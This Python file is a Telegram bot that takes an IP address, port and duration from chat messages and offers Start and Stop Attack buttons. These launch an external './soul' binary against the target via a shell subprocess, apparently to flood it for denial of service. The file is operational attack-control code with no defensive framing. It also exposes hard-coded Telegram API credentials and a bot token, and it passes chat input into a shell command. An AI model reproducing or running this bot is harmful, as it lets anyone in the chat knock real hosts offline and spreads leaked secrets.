import logging
from telethon import TelegramClient, events, Button
import subprocess

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Your bot credentials
API_ID = 22157690
API_HASH = "819a20b5347be3a190163fff29d59d81"
BOT_TOKEN = "7483201528:AAGLZzUEMYYN-wYmYUUwD8eVOQyiflG8-d4"

client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Global variables to track the attack state
attack_process = None
attack_info = {}  # Store attack info
status_message_id = None  # To keep track of the status message ID

@client.on(events.NewMessage(pattern='(?P<command>\d+\.\d+\.\d+\.\d+ \d+ \d+)'))
async def handle_attack_command(event):
    global attack_info, status_message_id
    command_parts = event.raw_text.split()
    target = command_parts[0]
    port = command_parts[1]
    attack_time = command_parts[2]

    # Store attack info in a dictionary
    attack_info[event.chat.id] = {
        'target': target,
        'port': port,
        'attack_time': attack_time
    }

    logging.info(f"Received attack command: {target}:{port} for {attack_time} seconds.")
    
    # Send inline buttons for start and stop
    buttons = [
        [Button.inline("Start Attack", b'start_attack'),
         Button.inline("Stop Attack", b'stop_attack')]
    ]
    await event.respond("Choose an option:", buttons=buttons)

    # Send an initial status message
    status_message = await event.respond("Status: Idle")
    status_message_id = status_message.id  # Store the message ID for status updates

@client.on(events.CallbackQuery)
async def handle_callback_query(event):
    global attack_process, status_message_id
    if event.data == b'start_attack':
        if attack_process is None:
            # Retrieve target, port, and attack_time from the dictionary
            info = attack_info.get(event.chat.id)
            if info:
                target = info['target']
                port = info['port']
                attack_time = info['attack_time']

                # Start the attack as a subprocess
                attack_process = subprocess.Popen(f"./soul {target} {port} {attack_time}", shell=True)
                logging.info(f"Attack started: {target}:{port} for {attack_time} seconds.")

                # Update the status message
                await client.edit_message(event.chat_id, status_message_id, 
                    f"Status: Attacking {target}:{port} for {attack_time} seconds.")
            else:
                await event.respond("⚠️ No attack information found.")
                logging.warning(f"No attack information found for chat ID: {event.chat.id}.")
        else:
            await event.respond("⚠️ Attack is already running.")
            logging.warning("Attempted to start an attack that is already running.")

    elif event.data == b'stop_attack':
        if attack_process:
            attack_process.terminate()  # Stop the attack
            attack_process = None
            
            # Update the status message to show it has been stopped
            await client.edit_message(event.chat_id, status_message_id, 
                "Status: Attack stopped.")
            logging.info("Attack stopped.")
        else:
            await client.edit_message(event.chat_id, status_message_id, 
                "Status: No attack is currently running.")
            logging.warning("Attempted to stop an attack that is not running.")

# Start the bot
if __name__ == "__main__":
    logging.info("Starting the bot...")
    client.start()
    client.run_until_disconnected()
    logging.info("Bot has been stopped.")
                                      
